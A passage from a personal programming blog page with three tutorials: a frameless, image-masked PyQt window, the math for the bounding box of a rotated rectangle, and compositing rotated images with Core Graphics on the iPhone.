<li>A texteditor</li>
<li>A cup of coffee</li>
</ol>

<p>Set the coffee aside so you don’t knock it over, but keep it within reach. First we need to open up Designer.</p>

<p>Once open create a new Dialog or MainWindow. Open the resource browser and add your background image to the list of resources. Now right click on the <strong>window</strong> and select <code>Change styleSheet</code> (I am using Designer4 in case it looks different for you). Enter the following in the popup, adjusting for names and path as appropriate.</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#Dialog{</span>
    <span style="color: #f8f8f2">background</span><span style="color: #f92672">-</span><span style="color: #f8f8f2">color:</span> <span style="color: #f8f8f2">rgb(</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">);</span>
    <span style="color: #f8f8f2">background</span><span style="color: #f92672">-</span><span style="color: #f8f8f2">image:</span> <span style="color: #f8f8f2">url(:</span><span style="color: #f92672">/</span><span style="color: #f8f8f2">img</span><span style="color: #f92672">/</span><span style="color: #f8f8f2">windowshape</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">png);</span>
<span style="color: #f8f8f2">}</span>
</pre></div>


<p>Adjusting the <code>#Dialog</code> to the <strong>window</strong> name and the url path to your image.</p>

<p>You should now see the image in the <strong>window</strong> with a black surround. At this point it’s also good to set the <strong>window</strong> size to something suitable for your image.</p>

<p>As per usual you will need to compile your .ui and resource files with pyuic and pyrcc, but details on that are outside the scope of this post.
So in order to remove the border we call this in our <code>__init__</code> function</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #f8f8f2">self</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">win</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">QtGui</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">QMainWindow()</span>
<span style="color: #f8f8f2">self</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">win</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">setWindowFlags(self</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">win</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">windowFlags()</span> <span style="color: #f92672">|</span>
    <span style="color: #f8f8f2">QtCore</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">Qt</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">FramelessWindowHint</span> <span style="color: #f92672">|</span>
    <span style="color: #f8f8f2">QtCore</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">Qt</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">WindowSystemMenuHint)</span>
</pre></div>


<p>It’s important to derive your class from <code>QtGui.QMainWindow</code> otherwise this won’t work.</p>

<p>Don’t be surprised if under certain <strong>window</strong> managers you still see a border, not all <strong>window</strong> managers will render windows without borders from <strong>Qt</strong>. The settings are just a request rather than a demand. In Fluxbox for instance the border still shows. Gnome and KDE work fine.</p>

<p>Right, time for a sip of coffee. You earned it. But wait, what about the black colour? We want the <strong>window</strong> in the shape of the image. Ah yes, we do that by adding this function</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #66d9ef">def</span> <span style="color: #a6e22e">resizeEvent</span><span style="color: #f8f8f2">(self,</span> <span style="color: #f8f8f2">event):</span>
    <span style="color: #f8f8f2">pixmap</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">QtGui</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">QPixmap(</span><span style="color: #e6db74">&quot;:/img/windowshape.png&quot;</span><span style="color: #f8f8f2">)</span>
    <span style="color: #f8f8f2">region</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">QtGui</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">QRegion(pixmap</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">mask())</span>
    <span style="color: #f8f8f2">self</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">setMask(pixmap</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">mask());</span>
</pre></div>
</p>

<p>This will tell <strong>Qt</strong> to use the image as a mask for the <strong>window</strong> region, effectively hiding any parts where the image is transparent.</p>

<p>More coffee, we&rsquo;re almost there. Right now, as you&rsquo;re swallowing that last sip, you&rsquo;re wondering &ldquo;How do I move or close the <strong>window</strong> without a border?&ldquo;. Fear not fellow coder for there is a solution for each of these:</p>

<p>To close the <strong>window</strong> we just need to add a context menu. Simply done by adding one more function to your class:</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #66d9ef">def</span> <span style="color: #a6e22e">contextMenuEvent</span><span style="color: #f8f8f2">(self,</span> <span style="color: #f8f8f2">event):</span>
    <span style="color: #f8f8f2">menu</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">QtGui</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">QMenu(self)</span>
    <span style="color: #f8f8f2">quitAction</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">menu</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">addAction(</span><span style="color: #e6db74">&quot;Quit&quot;</span><span style="color: #f8f8f2">)</span>
    <span style="color: #f8f8f2">action</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">menu</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">exec_(self</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">mapToGlobal(event</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">pos()))</span>
    <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">action</span> <span style="color: #f92672">==</span> <span style="color: #f8f8f2">quitAction:</span>
        <span style="color: #f8f8f2">self</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">close()</span>
</pre></div>
</p>

<p>You can of course replace the <code>self.close()</code> with a call to some confirmation dialog if you want, but that will now enable a right-click menu on your GUI with a quit option. Also you can add keyboard shortcuts to the application as well if you are so inclined.</p>

<p>Now for moving the thing. Here we need two extra functions, one for the mouse move and one for the mouse press:</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #66d9ef">def</span> <span style="color: #a6e22e">mouseMoveEvent</span><span style="color: #f8f8f2">(self,</span> <span style="color: #f8f8f2">event):</span>
    <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">(event</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">buttons()</span> <span style="color: #f92672">==</span> <span style="color: #f8f8f2">QtCore</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">Qt</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">LeftButton):</span>
        <span style="color: #f8f8f2">self</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">move(event</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">globalPos()</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">x()</span> <span style="color: #f92672">-</span> <span style="color: #f8f8f2">self</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">drag_position</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">x(),</span>
            <span style="color: #f8f8f2">event</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">globalPos()</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">y()</span> <span style="color: #f92672">-</span> <span style="color: #f8f8f2">self</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">drag_position</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">y());</span>
    <span style="color: #f8f8f2">event</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">accept();</span>

<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">mousePressEvent</span><span style="color: #f8f8f2">(self,</span> <span style="color: #f8f8f2">event):</span>
    <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">(event</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">button()</span> <span style="color: #f92672">==</span> <span style="color: #f8f8f2">QtCore</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">Qt</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">LeftButton):</span>
        <span style="color: #f8f8f2">self</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">drag_position</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">event</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">globalPos()</span> <span style="color: #f92672">-</span> <span style="color: #f8f8f2">self</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">pos();</span>
    <span style="color: #f8f8f2">event</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">accept();</span>
</pre></div>
</p>

<p>We just get the click position when the mouse button is pressed, work out the offset from the top left corner of the <strong>window</strong> (this is what the move function uses) and then when the mouse moves, we move the <strong>window</strong> with it.</p>

<p>That&rsquo;s it really. Pretty simple once you know how. Now go and enjoy the rest of that coffee.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2009/12/04/bounding-box-of-rotated-image/">
        Bounding box of rotated image
      </a>
    </h1>

    <span class="post-date">Fri, Dec 4, 2009</span>

    <p>In a previous post I mentioned about finding the width and height of the bounding box of a rotated rectangle, in this post I will explain the math in more detail. Given a 2D rectangle and an arbitrary angle of rotation, how do we work out the new bounding box of the rectangle?</p>

<p>I&rsquo;ll use the image below to help illustrate:</p>


<figure >
    
        <img src="http://unlogic.co.uk/images/content/bbox.jpg" />
    
    
</figure>


<p>The blue rectangle is our original shape and the red one our (obviously) newly rotated rectangle. α is the angle we’ve rotated by in degrees Let’s think back to maths class and try to remember our trigonometry. In order to find the length of a given side in a right angled triangle we take one of the known sides and an angle and apply sin, cos or tan accordingly.</p>

<p>Our aim here is to find h1, h2, w1, and w2 in order to get</p>

<pre><code>h' = h1 + h2
w' = w1 + w2
</code></pre>

<p>Where h’ and w’ are the new width and height of the bounding box. Let’s start with w1 and h1, referring back to the top right triangle in the diagram. We know the length of the hypotenuse so we need to use cos for w1 (adjacent) and then for h1 (opposite) we need to use sin</p>

<pre><code>w1 = h * sin(a) 
h1 = h * cos(a)
</code></pre>

<p>Half way there. Next we find w2 and h2 in a similar way</p>

<pre><code>w2 = w * cos(a)
h2 = w * sin(a)
</code></pre>

<p>Now all we need to do is add h1 and h2 together to get h’ and w1 to w1 to get w’. In code that is</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">    <span style="color: #66d9ef">float</span> <span style="color: #f8f8f2">h_dash</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">h</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">fabs(cos(alpha))</span> <span style="color: #f92672">+</span> <span style="color: #f8f8f2">w</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">fabs(sin(alpha));</span>
    <span style="color: #66d9ef">float</span> <span style="color: #f8f8f2">w_dash</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">w</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">fabs(cos(alpha))</span> <span style="color: #f92672">+</span> <span style="color: #f8f8f2">h</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">fabs(sin(alpha));</span>
</pre></div>


<p>The more astute of you may have noticed that this is slightly different to what I posted in my previous article. That’s because I noticed I can do away with beta and use just the angle of rotation. In terms of execution time this means very little as beta is obtained once by subtraction alpha from 90, but in a neatness sense it’s an improvement.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2009/04/12/compositing-images-on-an-iphone-with-core-graphics/">
        Compositing images on an iPhone with Core Graphics
      </a>
    </h1>

    <span class="post-date">Sun, Apr 12, 2009</span>

    <p>How do you take two images, one with rotation and scale applied, and compose the two together in memory and save the result to the device? We make use of core graphics and a little bit of math.</p>

<p>To set the scene properly here’s what we have: we have an image that’s been scaled and rotated and positioned on screen, over which we would like to place an image that will fill the screen and always be the same size, this is the overlay. Our overlay is 320×480 and positioned centrally in the display and contains transparency to let the background show through. Both images are PNG files.</p>

<p>So what we want to do is create two frames, one for the background image and one for the overlay. Then we create a graphics context for the background image, rotate it, draw our image into it, position it on screen, and then composite the overlay on top of that. Once that’s done we grab the image (now composited) from the graphics context and write it to the device.</p>

<p>Ready? Then let’s set up a frame for both the background image and the overlay</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">// Assume that overlay and userImage are our UIImages</span>
<span style="color: #75715e">// overlay and background images respectively</span>
<span style="color: #75715e">// Overlay frame</span>
<span style="color: #f8f8f2">CGRect</span> <span style="color: #f8f8f2">frame;</span>
<span style="color: #f8f8f2">frame.origin</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">CGPointMake(</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">,</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">);</span>
<span style="color: #f8f8f2">frame.size</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">CGSizeMake(</span><span style="color: #ae81ff">320</span><span style="color: #f8f8f2">,</span><span style="color: #ae81ff">480</span><span style="color: #f8f8f2">);</span>

<span style="color: #75715e">// background frame</span>
<span style="color: #75715e">// Scale is the factor the image is scaled by (float)</span>
<span style="color: #f8f8f2">CGRect</span> <span style="color: #f8f8f2">bgFrame;</span>
<span style="color: #f8f8f2">bgFrame.size</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">userImage.size;</span>
<span style="color: #f8f8f2">bgFrame.size.width</span> <span style="color: #f92672">*=</span> <span style="color: #f8f8f2">scale;</span>
<span style="color: #f8f8f2">bgFrame.size.height</span> <span style="color: #f92672">*=</span> <span style="color: #f8f8f2">scale;</span>
</pre></div>


<p>In order to draw our image rotated we actually need to rotate the context and then draw our image into it. We also need to know the size of the rectangle that contains the rotated context. We’ll use some simple trig to work that out. We need this new size in order to correctly position the background, as core graphics uses the top left corner to place the context and after the rotation the top left corner has moved somewhat.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">// Get the size of the background frame (unrotated)</span>
<span style="color: #f8f8f2">CGSize</span> <span style="color: #f8f8f2">size</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">bgFrame.size;</span>

<span style="color: #75715e">// Work out the bounding box for the rotated image</span>
<span style="color: #66d9ef">float</span> <span style="color: #f8f8f2">h</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">size.height;</span>
<span style="color: #66d9ef">float</span> <span style="color: #f8f8f2">w</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">size.width;</span>
<span style="color: #75715e">// Using the trig we need to know 90deg - the actual rotation angle</span>
<span style="color: #66d9ef">float</span> <span style="color: #f8f8f2">beta</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">DEGREES_TO_RADIANS(</span><span style="color: #ae81ff">90.0</span> <span style="color: #f92672">-</span> <span style="color: #f8f8f2">(rotation));</span>

<span style="color: #75715e">// Do the trig for the new size</span>
<span style="color: #66d9ef">float</span> <span style="color: #f8f8f2">h1</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">h</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">fabs(sin(beta))</span> <span style="color: #f92672">+</span> <span style="color: #f8f8f2">w</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">fabs(cos(beta));</span>
<span style="color: #66d9ef">float</span> <span style="color: #f8f8f2">w1</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">w</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">fabs(sin(beta))</span> <span style="color: #f92672">+</span> <span style="color: #f8f8f2">h</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">fabs(cos(beta));</span>
<span style="color: #75715e">// CG works in radians - Using a macro to do the work</span>
<span style="color: #66d9ef">float</span> <span style="color: #f8f8f2">angle</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">DEGREES_TO_RADIANS(rotation);</span>
<span style="color: #f8f8f2">CGSize</span> <span style="color: #f8f8f2">tempFrame;</span>
<span style="color: #f8f8f2">tempFrame.height</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">h1;</span>
<span style="color: #f8f8f2">tempFrame.width</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">w1;</span>

<span style="color: #75715e">// Rotation Context starts here</span>
<span style="color: #75715e">// draw the image into it</span>
<span style="color: #f8f8f2">UIGraphicsBeginImageContext(tempFrame);</span>
<span style="color: #f8f8f2">CGContextRef</span> <span style="color: #f8f8f2">ctx</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">UIGraphicsGetCurrentContext();</span>
<span style="color: #75715e">// Rotate around center</span>
<span style="color: #f8f8f2">CGContextTranslateCTM(ctx,</span> <span style="color: #f8f8f2">tempFrame.width</span><span style="color: #f92672">/</span><span style="color: #ae81ff">2.0</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">tempFrame.height</span><span style="color: #f92672">/</span><span style="color: #ae81ff">2.0</span><span style="color: #f8f8f2">);</span>
<span style="color: #f8f8f2">CGContextRotateCTM(ctx,</span> <span style="color: #f8f8f2">angle);</span>
<span style="color: #f8f8f2">CGContextTranslateCTM(ctx,</span> <span style="color: #f92672">-</span><span style="color: #f8f8f2">tempFrame.width</span><span style="color: #f92672">/</span><span style="color: #ae81ff">2.0</span><span style="color: #f8f8f2">,</span> <span style="color: #f92672">-</span><span style="color: #f8f8f2">tempFrame.height</span><span style="color: #f92672">/</span><span style="color: #ae81ff">2.0</span><span style="color: #f8f8f2">);</span>

<span style="color: #75715e">// Origin is this for some reason. One day I&#39;ll figure it out</span>
<span style="color: #f8f8f2">bgFrame.origin</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">CGPointMake((w1</span> <span style="color: #f92672">-</span> <span style="color: #f8f8f2">bgFrame.size.width)</span><span style="color: #f92672">/</span><span style="color: #ae81ff">2.0</span><span style="color: #f8f8f2">,</span>
                             <span style="color: #f8f8f2">(h1</span> <span style="color: #f92672">-</span> <span style="color: #f8f8f2">bgFrame.size.height)</span><span style="color: #f92672">/</span><span style="color: #ae81ff">2.0</span><span style="color: #f8f8f2">);</span>

<span style="color: #75715e">// Draw it</span>
<span style="color: #f8f8f2">[userImage.image</span> <span style="color: #f8f8f2">drawInRect:bgFrame];</span>

<span style="color: #75715e">// Get it</span>
<span style="color: #f8f8f2">UIImage</span> <span style="color: #f92672">*</span><span style="color: #66d9ef">copy</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">UIGraphicsGetImageFromCurrentImageContext();</span>
<span style="color: #f8f8f2">UIGraphicsEndImageContext();</span>
</pre></div>
</p>

<p>You will notice I&rsquo;m a bit bewildered as to why the origin of the background frame is what it is. I figured this out by experimenting a bit, but haven&rsquo;t yet got round to working out the exact science/reason behind it. If you know why, I&rsquo;d appreciate you leaving a comment here, or emailing me, so I can update this page.</p>

<p>Home stretch now, we&rsquo;re almost done. Just draw the overlay and then nab the contents of the context and write it to the device</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">// On to the comp</span>
<span style="color: #f8f8f2">bgFrame.size.height</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">h1;</span>
<span style="color: #f8f8f2">bgFrame.size.width</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">w1;</span>
<span style="color: #75715e">// position is where the original image was placed on screen</span>
<span style="color: #75715e">// in this case the coordinate for the position was the center of the image</span>
<span style="color: #75715e">// hence the adjustments</span>
<span style="color: #f8f8f2">bgFrame.origin</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">CGPointMake(position.x</span> <span style="color: #f92672">-</span> <span style="color: #f8f8f2">(bgFrame.size.width</span><span style="color: #f92672">/</span><span style="color: #ae81ff">2.0</span><span style="color: #f8f8f2">),</span>
                            <span style="color: #ae81ff">480</span> <span style="color: #f92672">-</span> <span style="color: #f8f8f2">(bgFrame.size.height</span><span style="color: #f92672">/</span><span style="color: #ae81ff">2.0</span><span style="color: #f8f8f2">)</span> <span style="color: #f92672">-</span> <span style="color: #f8f8f2">position.y);</span>

<span style="color: #f8f8f2">UIGraphicsBeginImageContext(frame.size);</span>
<span style="color: #75715e">// draw the background and overlay</span>
<span style="color: #f8f8f2">[</span><span style="color: #66d9ef">copy</span> <span style="color: #f8f8f2">drawInRect:bgFrame];</span>
<span style="color: #f8f8f2">[overlay</span> <span style="color: #f8f8f2">drawInRect:frame];</span>
<span style="color: #f8f8f2">[overlay</span> <span style="color: #66d9ef">release</span><span style="color: #f8f8f2">];</span>

<span style="color: #75715e">// Get and save the comp image</span>
<span style="color: #f8f8f2">UIImage</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">newImage</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">UIGraphicsGetImageFromCurrentImageContext();</span>
<span style="color: #f8f8f2">UIGraphicsEndImageContext();</span>
<span style="color: #f8f8f2">UIImageWriteToSavedPhotosAlbum(newImage,</span> <span style="color: #f8f8f2">self,</span> <span style="color: #f8f8f2">nil,</span> <span style="color: #f8f8f2">nil);</span>
</pre></div>
</p>

<p>And there we go. You can adjust the <code>UIImageWriteToSavedPhotosAlbum</code> if you need the callback, but I omitted it in this case.</p>

  </div>
  
</div>
</div>

  </body>
</html>
